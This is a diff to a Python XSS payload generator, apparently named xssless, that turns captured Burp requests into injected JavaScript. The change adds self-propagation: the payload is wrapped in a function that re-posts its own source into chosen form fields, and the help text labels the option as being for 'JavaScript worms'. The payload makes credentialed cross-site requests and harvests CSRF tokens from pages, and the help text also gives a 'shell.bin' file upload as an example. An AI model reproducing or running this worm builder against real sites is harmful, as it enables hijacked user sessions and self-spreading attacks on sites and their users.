@@ -202,48 +202,51 @@ def xss_gen(requestList, settingsDict):
     # Start of the payload, uncompressed
     payload = """
 <script type="text/javascript">
-    var funcNum = 0;
-    function doRequest(url, method, body)
-    {
-        var http = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
-        http.withCredentials = true;
-        http.onreadystatechange = function() {
-            if (this.readyState == 4) {
-                var response = http.responseText; 
-                var d = document.implementation.createHTMLDocument("");
-                d.documentElement.innerHTML = response;
-                requestDoc = d;
-                funcNum++;
-                try {
-                    window['r' + funcNum](requestDoc);
-                } catch (error) {}
-            }    
-        };
-        if(method == "POST")
+    m();
+    function m() {
+        var funcNum = 0;
+        doRequest = function(url, method, body)
         {
-            http.open('POST', url, true);
-            http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-            http.setRequestHeader('Content-length', body.length);
-            http.setRequestHeader('Connection', 'close');
-            http.send(body);
-        } else if (method == "MPOST") {
-            http.open('POST', url, true);
-            var bound = Math.random().toString(36).slice(2);
-            body = body.split("BOUNDMARKER").join(bound);
-            http.setRequestHeader('Content-type', 'multipart/form-data, boundary=' + bound);
-            http.setRequestHeader('Content-length', body.length);
-            http.setRequestHeader('Connection', 'close');
-            http.sendAsBinary(body);
-                
-        } else if (method == "GET") {
-            http.open('GET', url, true); 
-            http.send();
-        } else if (method == "HEAD") {
-            http.open('HEAD', url, true); 
-            http.send();
+            var http = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
+            http.withCredentials = true;
+            http.onreadystatechange = function() {
+                if (this.readyState == 4) {
+                    var response = http.responseText; 
+                    var d = document.implementation.createHTMLDocument("");
+                    d.documentElement.innerHTML = response;
+                    requestDoc = d;
+                    funcNum++;
+                    try {
+                        window['r' + funcNum](requestDoc);
+                    } catch (error) {}
+                }    
+            };
+            if(method == "POST")
+            {
+                http.open('POST', url, true);
+                http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+                http.setRequestHeader('Content-length', body.length);
+                http.setRequestHeader('Connection', 'close');
+                http.send(body);
+            } else if (method == "MPOST") {
+                http.open('POST', url, true);
+                var bound = Math.random().toString(36).slice(2);
+                body = body.split("BOUNDMARKER").join(bound);
+                http.setRequestHeader('Content-type', 'multipart/form-data, boundary=' + bound);
+                http.setRequestHeader('Content-length', body.length);
+                http.setRequestHeader('Connection', 'close');
+                http.sendAsBinary(body);
+                    
+            } else if (method == "GET") {
+                http.open('GET', url, true); 
+                http.send();
+            } else if (method == "HEAD") {
+                http.open('HEAD', url, true); 
+                http.send();
+            }
         }
+        r0();
     }
-    r0();
 """
 
     # Function chaining is implemented to avoid the issue of freezing the user's browser during 'secret' JS activity
@@ -309,6 +312,11 @@ def xss_gen(requestList, settingsDict):
                             postString += pair['Key'] + "=" + "' + encodeURIComponent(requestDoc.getElementsByName('" + pair['Key'] + "')[0].value) + '&"
                         else:
                             postString += pair['Key'] + "=" + pair['Value'] + "&"
+                    elif 'metaList' in settingsDict:
+                        if pair['Key'] in settingsDict['metaList']:
+                            postString += pair['Key'] + "=" + "%3Cscript%3Em()%3B' + encodeURIComponent(m.toString()) + '%3C%2Fscript%3E&"
+                        else:
+                            postString += pair['Key'] + "=" + pair['Value'] + "&"
                     else:
                         postString += pair['Key'] + "=" + pair['Value'] + "&"
 
@@ -344,8 +352,9 @@ helpmenu = """
 Example: """ + sys.argv[0] + """ [ OPTION(S) ] [ BURP FILE ]
 
 -h               Shows this help menu
--p=PARSEFILE     Parse list - input file containing a list of CSRF token names to be automatically parsed and set with JS.
+-p=PARSEFILE     Parse list - input file containing a list of CSRF token names to be automatically parsed and set.
 -f=FILELIST      File list - input list of POST name/filenames to use in payload. ex: 'upload_filename,~/Desktop/shell.bin'
+-m=METALIST      Self propagation list - input list of POST names for POSTing the XSS payload itself (for JavaScript worms)
 -s               Don't display the xssless logo
 
 """
@@ -365,6 +374,16 @@ else:
             sys.exit()
         if option == "-s":
             showlogo = False
+        if "-m=" in option:
+            metafile = option.replace("-m=", "")
+            if os.path.isfile(metafile):
+                tmpList = open(metafile).readlines()
+                for key,value in enumerate(tmpList):
+                    tmpList[key] = value.replace("\n", "")
+                if len(tmpList):
+                    settingsDict['metaList'] = tmpList
+            else:
+                print "Error, meta list not found!"
         if "-p=" in option:
             parsefile = option.replace("-p=", "")
             if os.path.isfile(parsefile):
